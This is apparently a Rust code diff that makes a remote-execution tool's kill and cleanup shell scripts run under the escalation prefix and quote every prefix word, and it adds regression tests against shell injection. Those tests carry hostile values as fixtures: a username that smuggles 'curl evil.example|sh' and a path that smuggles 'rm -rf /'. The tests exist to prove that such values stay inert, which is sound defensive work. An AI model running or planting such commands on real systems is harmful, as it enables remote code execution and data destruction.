@@ -368,7 +368,7 @@ impl Transport {
                 let Some(t) = &target else {
                     bail!("no kill target for this process");
                 };
-                self.sh(&kill_script(&t.binary)).await?;
+                self.sh(&kill_script(t)).await?;
                 true
             }
             _ => false,
@@ -386,17 +386,47 @@ impl Transport {
     }
 }
 
-/// The remote snippet that kills `bin` and its children. Only processes
-/// actually running `bin` are signalled: `/proc/<pid>/exe` is the kernel's
-/// answer to "what is this process running", where a command line is just
-/// text that anything, this script included, can carry.
-fn kill_script(bin: &str) -> String {
-    let q = shell_quote(bin);
-    format!(
+/// The remote snippet that kills the binary and its children. Only
+/// processes actually running it are signalled: `/proc/<pid>/exe` is the
+/// kernel's answer to "what is this process running", where a command line
+/// is just text that anything, this script included, can carry.
+///
+/// It runs behind the binary's own escalation prefix, because both halves
+/// need the identity that owns the processes. `/proc/<pid>/exe` is not
+/// readable for another user's process (it needs ptrace access), so an
+/// unescalated script skips every candidate of an escalated run at the
+/// guard, and `kill` would be refused even if it reached one. Such a run
+/// used to survive this script entirely and die from the ssh session being
+/// torn down, which is luck rather than cancellation.
+fn kill_script(t: &KillTarget) -> String {
+    let q = shell_quote(&t.binary);
+    let inner = format!(
         "for p in $(pgrep -f {q}); do \
            [ \"$(readlink /proc/$p/exe 2>/dev/null)\" = {q} ] || continue; \
            pkill -KILL -P \"$p\"; kill -KILL \"$p\"; \
          done 2>/dev/null; true"
+    );
+    match escalation_words(&t.escalate) {
+        None => inner,
+        Some(esc) => format!("{esc} sh -c {}", shell_quote(&inner)),
+    }
+}
+
+/// The escalation prefix as shell words, each quoted. `escalate_user` comes
+/// from the inventory unvalidated, and the inventory is data in our model:
+/// everywhere else it reaches the target as an argv element that `openssh`
+/// quotes, and only these scripts put it through a shell, so they quote it
+/// themselves. `None` when nothing escalates.
+fn escalation_words(prefix: &[String]) -> Option<String> {
+    if prefix.is_empty() {
+        return None;
+    }
+    Some(
+        prefix
+            .iter()
+            .map(|w| shell_quote(w))
+            .collect::<Vec<_>>()
+            .join(" "),
     )
 }
 
@@ -409,12 +439,14 @@ fn kill_script(bin: &str) -> String {
 /// can remove it.
 fn remove_run_dir_script(t: &KillTarget) -> String {
     let dir = shell_quote(&t.run_dir);
-    let esc = if t.escalate.is_empty() {
-        String::new()
-    } else {
-        format!("{} ", t.escalate.join(" "))
-    };
-    format!("{esc}rm -rf -- \"${{TMPDIR:-/tmp}}\"/{dir}; true")
+    // `$TMPDIR` is expanded by the session's own shell and `rm` gets the
+    // result as an argument. Expanding it inside an escalated shell would
+    // read root's environment, not the one the binary ran with.
+    let path = format!("\"${{TMPDIR:-/tmp}}\"/{dir}");
+    match escalation_words(&t.escalate) {
+        None => format!("rm -rf -- {path}; true"),
+        Some(esc) => format!("{esc} rm -rf -- {path}; true"),
+    }
 }
 
 #[cfg(test)]
@@ -444,7 +476,7 @@ mod tests {
             ..unescalated.clone()
         };
         assert!(
-            remove_run_dir_script(&as_root).starts_with("sudo -n rm -rf --"),
+            remove_run_dir_script(&as_root).starts_with("'sudo' '-n' rm -rf --"),
             "{}",
             remove_run_dir_script(&as_root)
         );
@@ -453,7 +485,7 @@ mod tests {
             ..unescalated.clone()
         };
         assert!(
-            remove_run_dir_script(&as_admin).starts_with("sudo -n -u admin rm -rf --"),
+            remove_run_dir_script(&as_admin).starts_with("'sudo' '-n' '-u' 'admin' rm -rf --"),
             "{}",
             remove_run_dir_script(&as_admin)
         );
@@ -461,15 +493,73 @@ mod tests {
         // The name arrives over the wire; it cannot close the quoting.
         let nasty = KillTarget {
             run_dir: "x'; rm -rf /; '".into(),
-            ..unescalated
+            ..unescalated.clone()
         };
         let script = remove_run_dir_script(&nasty);
         assert!(!script.contains("x'; rm -rf /"), "{script}");
     }
 
+    /// `escalate_user` is an unvalidated string from the KDL inventory. It
+    /// is safe everywhere else because `exec_argv` passes it as argv and
+    /// `openssh` quotes each element; these two scripts are the only place
+    /// it goes through a shell, so they quote it themselves.
+    #[test]
+    fn an_escalate_user_with_shell_metacharacters_is_quoted_not_run() {
+        let evil = KillTarget {
+            binary: "/home/x/.cache/rustible/bin/p-ab".into(),
+            run_dir: ".rustible-1a".into(),
+            escalate: vec![
+                "sudo".into(),
+                "-n".into(),
+                "-u".into(),
+                "x; curl evil.example|sh".into(),
+            ],
+        };
+        for script in [kill_script(&evil), remove_run_dir_script(&evil)] {
+            // One quoted word, so `sh` passes it to sudo as a username
+            // rather than ending the command and running `curl`.
+            assert!(
+                script.contains("'x; curl evil.example|sh'"),
+                "expected the user quoted as one word: {script}"
+            );
+            assert!(
+                !script.contains(" x; curl"),
+                "the payload appears as a bare word: {script}"
+            );
+        }
+    }
+
+    /// An escalated run's processes belong to the escalated user, and
+    /// `/proc/<pid>/exe` is not readable for another user's process, so an
+    /// unescalated kill script skips every candidate at its own guard.
+    #[test]
+    fn the_kill_script_runs_as_the_identity_that_owns_the_processes() {
+        let plain = KillTarget {
+            binary: "/home/cadu/.cache/rustible/bin/p-ab".into(),
+            run_dir: ".rustible-1a".into(),
+            escalate: vec![],
+        };
+        assert!(kill_script(&plain).starts_with("for p in $(pgrep -f "));
+
+        let as_root = KillTarget {
+            escalate: vec!["sudo".into(), "-n".into()],
+            ..plain
+        };
+        let script = kill_script(&as_root);
+        assert!(script.starts_with("'sudo' '-n' sh -c "), "{script}");
+        // The inner script's own expansions survive the nesting.
+        assert!(script.contains("pgrep -f "), "{script}");
+        assert!(script.contains("readlink /proc/"), "{script}");
+    }
+
     #[test]
     fn kill_script_only_signals_processes_running_the_binary() {
-        let script = kill_script("/home/cadu/.cache/rustible/bin/cadu_slow-ab12");
+        let bare = |bin: &str| KillTarget {
+            binary: bin.into(),
+            run_dir: ".rustible-1a".into(),
+            escalate: vec![],
+        };
+        let script = kill_script(&bare("/home/cadu/.cache/rustible/bin/cadu_slow-ab12"));
         // The path is quoted once for `pgrep` and once for the comparison,
         // and nothing is killed before `/proc/<pid>/exe` has been checked.
         assert_eq!(
@@ -482,7 +572,7 @@ mod tests {
         assert!(guard < script.find("kill -KILL").expect("kills"));
         // A path with a quote in it cannot close the quoting and run
         // something: the quote comes back escaped, never bare.
-        let nasty = kill_script("/tmp/x'; rm -rf /; '");
+        let nasty = kill_script(&bare("/tmp/x'; rm -rf /; '"));
         assert!(!nasty.contains("x'; rm"), "{nasty}");
         assert!(nasty.contains("x'\\''; rm"), "{nasty}");
     }
